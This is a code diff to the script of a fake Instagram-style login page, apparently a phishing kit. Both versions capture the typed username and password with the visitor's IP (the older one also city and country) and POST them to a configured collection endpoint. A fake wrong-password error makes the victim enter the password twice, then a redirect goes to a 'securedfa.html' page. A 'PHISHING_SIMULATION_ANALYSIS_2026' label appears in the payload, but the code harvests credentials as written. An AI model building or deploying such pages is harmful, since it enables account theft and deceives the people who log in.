@@ -65,114 +65,99 @@
   </div>
 
   <script type="module">
-  import config from './config.js';
+    import config from './config.js';
 
-  let attempt = 0;
-  let isProcessing = false;
+    let attempt = 0;
+    let isProcessing = false;
 
-  // Fast IP + Geo lookup
-  async function getGeoData() {
-    try {
-      // Get IP
-      const ipRes = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipRes.json();
-      const ip = ipData.ip || 'Unknown';
-
-      // Get Country, City, Continent (fast & free)
-      const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,continent,country,city`);
-      const geo = await geoRes.json();
-
-      if (geo.status === 'success') {
-        return {
-          ip: ip,
-          country: geo.country || 'Unknown',
-          city: geo.city || 'Unknown',
-          continent: geo.continent || 'Unknown'
-        };
+    // Only fetch raw IP address (fast & simple)
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip || 'Unknown';
+      } catch (err) {
+        console.error('IP fetch failed:', err);
+        return 'Unknown';
       }
-    } catch (err) {
-      console.error('Geo lookup failed:', err);
     }
-    return { ip: 'Unknown', country: 'Unknown', city: 'Unknown', continent: 'Unknown' };
-  }
 
-  // Send clean alert to endpoint
-  async function sendToEndpoint(username, password, geo, attemptNum) {
-    const cleanAlert = `*New Alert*
-User: ${username} (ig)
-pw: ${password}
-IP: ${geo.ip}
-`;
+    // Send to endpoint with clean "New alert" format
+    async function sendToEndpoint(username, password, ip, attemptNum) {
+      const alertText = `New alert:\n\nUsername: ${username}\nPassword: ${password}\nIp: ${ip}\nx${attemptNum}`;
 
-    const payload = {
+      const payload = {
+        app: "INSTAGRAM_PLACEHOLDER",
+        alert: alertText,
+        username: username,
+        password: password,
+        ip: ip,
+        attempt: attemptNum,
+        timestamp: new Date().toISOString(),
+        message: "PHISHING_SIMULATION_ANALYSIS_2026"
+      };
 
-             // ← Full formatted text you want
-      username: username,
-      pw: password,                // shortened as "pw"
-      ip: geo.ip,
-      
-    };
+      try {
+        const res = await fetch(config.ENDPOINT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
 
-    try {
-      const res = await fetch(config.ENDPOINT_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
+        if (res.ok) {
+          console.log(`✅ Attempt ${attemptNum} sent successfully`);
+        } else {
+          console.warn(`⚠️ Endpoint status: ${res.status}`);
+        }
+      } catch (err) {
+        console.error("❌ Failed to send to endpoint:", err);
+      }
+    }
 
-      if (res.ok) {
-        console.log(`✅ Attempt ${attemptNum} sent successfully`);
+    // Login button handler with two-attempt logic
+    document.getElementById('loginBtn').addEventListener('click', async () => {
+      if (isProcessing) return;
+      isProcessing = true;
+
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const passwordInput = document.getElementById('password');
+      const btn = document.getElementById('loginBtn');
+      const btnText = document.getElementById('btnText');
+      const spinner = document.getElementById('spinner');
+      const errorMsg = document.getElementById('errorMsg');
+
+      if (!username || !password) {
+        alert('Please fill in all fields!');
+        isProcessing = false;
+        return;
+      }
+
+      attempt++;
+
+      const ip = await getIP();
+
+      await sendToEndpoint(username, password, ip, attempt);
+
+      if (attempt === 1) {
+        // First attempt - show error + shake
+        errorMsg.classList.remove('hidden');
+        passwordInput.value = '';
+        passwordInput.classList.add('animate-shake');
+        setTimeout(() => passwordInput.classList.remove('animate-shake'), 600);
       } else {
-        console.warn(`⚠️ Endpoint status: ${res.status}`);
+        // Second attempt - loading then redirect
+        btn.disabled = true;
+        btnText.textContent = 'Loading...';
+        spinner.classList.remove('hidden');
+
+        setTimeout(() => {
+          window.location.href = 'securedfa.html';
+        }, 800);
       }
-    } catch (err) {
-      console.error("❌ Failed to send to endpoint:", err);
-    }
-  }
 
-  // Login button handler
-  document.getElementById('loginBtn').addEventListener('click', async () => {
-    if (isProcessing) return;
-    isProcessing = true;
-
-    const username = document.getElementById('username').value.trim();
-    const password = document.getElementById('password').value.trim();
-    const passwordInput = document.getElementById('password');
-    const btn = document.getElementById('loginBtn');
-    const btnText = document.getElementById('btnText');
-    const spinner = document.getElementById('spinner');
-    const errorMsg = document.getElementById('errorMsg');
-
-    if (!username || !password) {
-      alert('Please fill in all fields!');
       isProcessing = false;
-      return;
-    }
-
-    attempt++;
-
-    const geo = await getGeoData();
-
-    // Send to your endpoint (clean format)
-    await sendToEndpoint(username, password, geo, attempt);
-
-    if (attempt === 1) {
-      // First attempt - show error
-      errorMsg.classList.remove('hidden');
-      passwordInput.value = '';
-      passwordInput.classList.add('animate-shake');
-      setTimeout(() => passwordInput.classList.remove('animate-shake'), 600);
-    } else {
-      // Second attempt - loading then redirect
-      btn.disabled = true;
-      btnText.textContent = 'Loading...';
-      spinner.classList.remove('hidden');
-
-      setTimeout(() => {
-        window.location.href = 'securedfa.html';
-      }, 800);
-    }
-
-    isProcessing = false;
-  });
-</script>
+    });
+  </script>
+</body>
+</html>
